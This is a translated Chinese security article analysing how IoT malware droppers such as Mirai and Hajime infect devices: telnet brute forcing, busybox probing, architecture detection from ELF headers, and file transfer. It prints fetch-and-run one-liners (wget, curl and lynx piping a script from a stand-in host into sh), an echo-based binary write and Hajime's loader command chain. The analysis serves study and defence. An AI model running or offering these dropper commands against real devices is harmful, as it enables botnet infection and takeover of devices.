> 原文链接: https://www.anquanke.com//post/id/86184 


# 【技术分享】以Mirai僵尸网络为例，浅析IoT恶意软件dropper


                                阅读量   
                                **132345**
                            
                        |
                        
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966](https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0124110c653352f41b.jpg)](https://p3.ssl.qhimg.com/t0124110c653352f41b.jpg)



翻译：[童话](http://bobao.360.cn/member/contribute?uid=2782911444)

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿





**传送门**

[**从此次美国遭遇大规模DDOS攻击事件看IOT时代的网络安全问题**](http://bobao.360.cn/news/detail/3678.html)

[**【技术分享】关于mirai僵尸网络控制主机的数据分析**](http://bobao.360.cn/learning/detail/3143.html)



**IoT恶意软件概述**

IoT恶意软件即针对智能设备等物联网嵌入式设备的恶意程序。**最近一段时间以IoT设备为肉鸡的僵尸网络变得越来越流行。Mirai、Hajime、LuaBot等IoT僵尸网络的出现不断蚕食着互联网，一次又一次给用户敲响警钟，告诉我们IoT安全的重要性。**这些恶意软件通过入侵路由器、调制解调器（“猫”）、智能摄像头等其他连接在互联网上的IoT嵌入式设备，进而对目标网络发起DDOS攻击。



总的来说，恶意软件的感染过程没什么特别的。很多IoT恶意软件甚至不需要利用漏洞即可完成对目标设备的入侵。由于用户安全意识薄弱，购置部署智能设备后往往采用默认配置，即可能存在弱口令、空口令等安全问题。在这种情况下，感染这些IoT设备只要做一件事就好了，即使用一些常用的密码暴力破解telnet服务，直到登录成功为止。

通常来说，攻击者通过入侵telnet服务，往往可以拿到一个低权限的shell（译者注：这里所说的低权限应该是指多数只能设备采用一个阉割版的busybox提供交互式shell，仅能执行有限的命令）。

<br>

**安全客小百科：Mirai僵尸网络**

**2016年10月21日 11:10 UTC（北京时间19:10左右）Mirai僵尸网络对美国域名服务供应商Dyn发起DDOS攻击，导致美国东海岸地区许多网站宕机。**你可能没有听说Dyn，但你一定知道这些网站，如GitHub、Twitter、PayPal等。Dyn为这些著名网站提供基础的DNS服务，当其受到攻击时，用户无法通过域名访问这些站点。 Mirai僵尸网络即利用某款智能摄像头的漏洞入侵了大量的摄像头，利用这些摄像头进而发起DDOS攻击。

<br>

**dropper是什么？**

dropper的主要功能：

攻击者对存在漏洞的设备进行扫描（通过暴力破解等方式拿到智能设备root权限的shell）

攻击者通过登录telnet服务获得一个root权限的shell，尝试在该设备上安装恶意软件。

恶意软件执行，完成对目标设备的入侵。

**在目标设备中下载安装恶意程序的脚本通常被叫做dropper。因为这段代码可以通过一些手段把恶意软件释放（drop）到设备上。**

依托于目标设备上可用的工具，dropper的实现很简单，仅需几行代码，像下面这样：

```
wget -q http://evil-hax0r.com/m.sh -O - | sh
curl -s http://evil-hax0r.com/m.sh | sh
lynx -dump http://evil-hax0r.com/m.sh | sh
```

或者还可以需要通过已经建立的会话来进行文件的传输。在某种意义上，dropper类似于“[**Rubber Ducky**](http://www.freebuf.com/sectool/47411.html)”。只要提供一个交互式的终端，我们可以向服务端（即目标IoT设备）发送命令。

<br>

**详细分析dropper**

dropper的主要目的是在IoT设备上安装恶意软件并执行。这听起来很容易，但通常来讲需要以下几个步骤完成这件事。

**首先，在目标设备中找到一个具有可写和可执行权限的文件夹。通常来讲，/tmp文件夹一般会满足以上两个条件（可写、可执行），但是出于保险起见我们最好还是先测试一下。**

**第二，摸清楚目标设备的架构，以便可以释放正确的二进制文件。为了增加在互联网上的传播机会，针对嵌入式设备的恶意软件通常支持多种架构。你可能会遇到一些ARM架构，MIPS 32位、64架构的处理器。**

**最后，dropper必须设法将该恶意文件传输到嵌入式设备中并运行。**

注意：复杂的dropper还有更多的功能。如，检查机器是否已经被感染，移除其他的恶意软件，检查是否在调试环境中（虚拟机、沙盒等）。

对于初次接触这方面的人来说，我们只需关注基础部分就好了。

那么我们就跟着这些步骤一步一步的去研究吧，再此之前我们还要做一些准备工作。

<br>

**解析命令**

攻击者运行一个程序，感染远程的嵌入式设备。这个程序与远程嵌入式设备的telnet服务建立socket连接，通过socket连接发送和接收数据。通过socket传输的数据就是我们手动连接设备键入的内容。

为了便于后续操作，收集执行命令后回显的信息是非常有必要的。

许多恶意软件采用的方式是输入不存在的busybox命令记录每一个回显的值。你将看到如下命令：

```
nc; wget; /bin/busybox RANDOM_TAG
```

恶意软件Hajime使用上面的命令来检查当前busybox是否具有nc和wget命令。对于不存在的命令，busybox将返回以下内容。

```
COMMAND: applet not found
```

这样的话，上一个命令将产生以下回显结果：

```
nc: applet not found
wget: applet not found
RANDOM_TAG: applet not found
```

这意味着nc和wget命令在该设备中是不存在的。 

<br>

**找到一个合适的文件夹**

**如上所述，第一步，dropper首先要在在嵌入式设备中找到一个具有读写权限的文件夹释放（drop）文件。**

通常的做法是看执行cat /proc/mounts命令，输出的内容中是否包含字符串rw。（你可以在Linux系统中执行这个命令测试一下）。

需要注意的是，绝大多数的嵌入式设备都不支持grep命令，因此cat /proc/mounts | grep rw命令不能正常工作。相反dropper将读取cat命令的完整输出，然后从中寻找rw字符串。

Mirai和Hajime采用这种方式寻找合适的文件夹存储和运行文件。我们来看看Mirai执行的命令。

[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338) 

[![](https://p3.ssl.qhimg.com/t017861978432431e73.png)](https://p3.ssl.qhimg.com/t017861978432431e73.png)

你看到圈出的这行后面的TOKEN_QUERY了吗？你可以在[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/headers/includes.h](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/headers/includes.h)找到该文件预定义的内容，如下图所示。

```
#define TOKEN_QUERY     "/bin/busybox ECCHI"
#define TOKEN_RESPONSE  "ECCHI: applet not found"
```

现在我们已经知道TOKEN_QUERY就是"/bin/busybox ECCHI"。

<br>

**摸清目标设备架构**

**现在，dropper需要弄清楚想要感染的嵌入式设备的架构，便于下载正确的二进制文件。**

一般来说，您不会在嵌入式设备中使用readelf或file等命令判断目标设备的架构（因为有很多设备不支持这些命令），因此你需要通过其他的方式判断其架构。

在这里，我们可以通过解析ELF文件头的方式判断其架构。

为了做到这一点，dropper通常会cat一个已知的二进制文件。大多数的选择是/bin/echo。举个例子，我们看看Mirai的代码（也可以在文末的参考文献中看看Hajime是怎么处理的）

[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369) 

[![](https://p0.ssl.qhimg.com/t011c0616fa097a0a1c.png)](https://p0.ssl.qhimg.com/t011c0616fa097a0a1c.png)

你可以在上面的代码片段中看到状态如何设置为下一个循环（TELNET_DETECT_ARCH），然后命令发送到服务器并循环迭代完成。

在下一次迭代中，TELNET_DETECT_ARCH将被触发，并且cat的输出将被读取并处理。

[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383) 

[![](https://p3.ssl.qhimg.com/t01c7dfae27f1be0b23.png)](https://p3.ssl.qhimg.com/t01c7dfae27f1be0b23.png)

你可以在这里找到检查架构的代码

[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465) 

[![](https://p1.ssl.qhimg.com/t01da2325aa451582c0.png)](https://p1.ssl.qhimg.com/t01da2325aa451582c0.png)

正如我所说，Mirai做的是解析ELF头，并检查e_machine和e_ident字段来找出架构。

它将一个指针指向从socket链接读取到Elf_hdr结构体的缓冲区，然后只是访问这些字段。看看代码，Mirai实际上对ARM子类型进行了额外的检查。





**如何传输文件**

**现在，我们要弄清楚的是dropper如何将恶意软件传输到嵌入式设备。**

例如Mirai，先检查wget、tftp等命令是否存在（使用我们上面提到的技术即可判断）。你可以在下面的代码中看到详细的信息。

[https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431](https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431) 

[![](https://p3.ssl.qhimg.com/t0120cfaa516d46706b.png)](https://p3.ssl.qhimg.com/t0120cfaa516d46706b.png)

当其中一个工具可用是，我们就可以用他下载恶意软件，但是有时候这些命令都不能用的话，像Mirai采用的echo方法就很有必要了。



**使用echo传输文件**

So，这个echo方法到底是怎么工作的呢？很简单，仅仅是将一对16进制的字符串echo到一个文件中。像下面这样

```
echo -ne "x7fx45x4cx46x..." &gt; malware
```

但是，这只适用于非常小的二进制文件。对于较大的二进制文件，您可能必须将echo命令分成多个部分，并使用&gt;&gt;附加重定向将每个部分的内容追加写入到结果文件中。



**看看Hajime恶意软件是怎么做的**

Hajime案例是非常有趣的，因为它将释放恶意软件分为两个阶段。

首先部署了一个非常小的ELF二进制文件。这个二进制文件将会下载真正的恶意软件。它连接到预定义的服务器，接受真正的恶意软件内容。

```
cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI
```

.s即为使用echo命令下载的小型ELF文件。此文件此前由dropper下载好，具有执行权限。上述的shell代码将会执行如下操作。

**cp .s .i 复制小ELF文件（这个文件将下载一个真正的恶意软件）从.s到.i。**大家都知道文件名称前面带个“.”就是隐藏文件的意思（你可以使用ls -a命令查看到这些隐藏文件。）这可以使复制前后的文件具有相同的权限。这基本上意味着下载最终的恶意软件后，我们就不用做chmod 777 .i就拥有执行权限。

**&gt;.i. 这个命令的意思是截断文件的内容。 **换句话说，这是一种删除文件的所有内容并将其文件大小设置为0，保留文件权限。所以现在我们有一个具有执行权限的空文件。

**./.s&gt;.i **这个命令的意思就更明显了。现在它已经运行了一个下载器（这个下载器就是前面说的小的ELF文件，通过echo创建的），**将下载的内容重定向他的标准输出到一个空的可执行文件.i中**。正如我们上面所说，

该下载器连接到服务器，无论远程服务器响应任何内容，都将信息转储到stdout。可以将其想象成阉割版的wget。

**./.i;rm .s 这句命令的功能是将下载的恶意文件执****行，并将前文的下载器从磁盘上移除。**主恶意软件像一个守护进程，当开始执行./.i，程序将执行，下载器将删除。

到此为止，恶意软件已成功在目标设备中植入。

<br>

**总结**

文章到这里就基本结束了。希望大家读后能有所收获，如果这对你来说是一个新的领域，你将学习到一些东西。请自由分享你的意见，并在下面的评论中提出你的见解。

<br>

**参考文献**

本文内容基于以下内容提供信息：

Mirai 源代码：[https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src](https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src)

Hajime 分析：[https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf](https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf) 

<br>



**传送门**

[**从此次美国遭遇大规模DDOS攻击事件看IOT时代的网络安全问题**](http://bobao.360.cn/news/detail/3678.html)

[**【技术分享】关于mirai僵尸网络控制主机的数据分析**](http://bobao.360.cn/learning/detail/3143.html)

<br>
